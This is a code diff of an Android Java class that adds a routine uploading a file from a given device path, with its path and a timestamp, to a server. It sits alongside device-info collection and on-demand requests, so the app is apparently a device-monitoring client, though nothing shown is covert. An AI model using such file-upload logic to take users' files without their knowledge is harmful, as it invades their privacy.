@@ -1,15 +1,20 @@
 package com.inet.android.request;
 
+import java.io.File;
+import java.io.FileNotFoundException;
+
 import org.json.JSONException;
 import org.json.JSONObject;
 
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.preference.PreferenceManager;
+import android.util.Log;
 
 import com.inet.android.info.GetInfo;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
+import com.loopj.android.http.RequestParams;
 
 public class RequestList {
 	final private static String LOG_TAG = RequestList.class.getSimpleName()
@@ -28,7 +33,7 @@ public class RequestList {
 						+ sp.getString("account", "account"));
 
 		TokenRequest tr = new TokenRequest(mContext);
-		tr.sendRequest(1);
+		tr.sendRequest(ConstantRequest.TYPE_FIRST_TOKEN_REQUEST);
 	}
 
 	/**
@@ -123,7 +128,7 @@ public class RequestList {
 						+ sp.getString("account", "account"));
 
 		TokenRequest tr = new TokenRequest(mContext);
-		tr.sendRequest(2);
+		tr.sendRequest(ConstantRequest.TYPE_SECOND_TOKEN_REQUEST);
 	}
 
 	/**
@@ -141,19 +146,21 @@ public class RequestList {
 	 * Sending data request
 	 */
 	public static void sendDataRequest(String req, Context mContext) {
-		
+
 		Logging.doLog(LOG_TAG, "send data request", "send data request: ");
 		DataRequest dataReq = new DataRequest(mContext);
 		dataReq.sendRequest(req);
 	}
+
 	/**
 	 * Sending service data request
 	 */
-	public static void sendDataRequest(String area, String event, Context mContext) {
+	public static void sendDataRequest(String area, String event,
+			Context mContext) {
 		String sendJSONStr = null;
-	
+
 		try {
-			
+
 			JSONObject info = new JSONObject();
 			JSONObject object = new JSONObject();
 			info.put("area", area);
@@ -170,28 +177,73 @@ public class RequestList {
 		DataRequest dataReq = new DataRequest(mContext);
 		dataReq.sendRequest(sendJSONStr);
 	}
+	/*
+	 * Sending service data request
+	 */
+	public static void sendFileRequest(String request,
+			Context mContext) {
+		Logging.doLog(LOG_TAG, "sendFileRequest ", "sendFileRequest ");
+
+//		RequestParams params = new RequestParams();
+//		params.			
+//		Logging.doLog(LOG_TAG, "params " + params.toString(), "params "
+//					+ params.toString());
+//			FileCaller.sendRequest(request, mContext);
 	
+	}
+	/**
+	 * Sending service data request
+	 */
+	public static void sendFileRequest(int typeValue, String path,
+			Context mContext) {
+		Logging.doLog(LOG_TAG, "sendFileRequest ", "sendFileRequest ");
+
+		RequestParams params = new RequestParams();
+		try {
+			params.put("data[][time]", ConvertDate.logTime());
+			params.put("data[][type]", typeValue);
+			params.put("data[][path]", path);
+			params.put("key", System.currentTimeMillis());
+			params.put("data[][file]", new File(path));
+
+			Logging.doLog(LOG_TAG, "params " + params.toString() , "params "
+					+ params.toString());
+			FileCaller.sendRequest(params, mContext);
+		} catch (FileNotFoundException e) {
+			Log.d(LOG_TAG, "FileNotFoundException");
+			e.printStackTrace();
+		}
+	}
+
+	private static String lastPath = "";
+
+	public static void setLastFile(String path) {
+		lastPath = path;
+	}
+
+	public static String getLastFile() {
+		return lastPath;
+	}
+
 	/**
 	 * Sending demand request
 	 */
-	public static void sendDemandRequest(String request, String infoType, String complete,
-			String version, Context mContext) {
-		OnDemandRequest dr = new OnDemandRequest(infoType, complete,
-				version, mContext);
+	public static void sendDemandRequest(String request, int infoType,
+			String complete, String version, Context mContext) {
+		OnDemandRequest dr = new OnDemandRequest(infoType, complete, version,
+				mContext);
 		dr.sendRequest(request);
 	}
-	
-	
+
 	/**
 	 * Sending demand request
 	 */
 	public static void sendInfoDeviceRequest(Context mContext) {
-		
+
 		GetInfo getInfo = new GetInfo(mContext);
 		getInfo.startGetInfo();
 	}
-	
-	
+
 	/**
 	 * Send a request for removal
 	 */
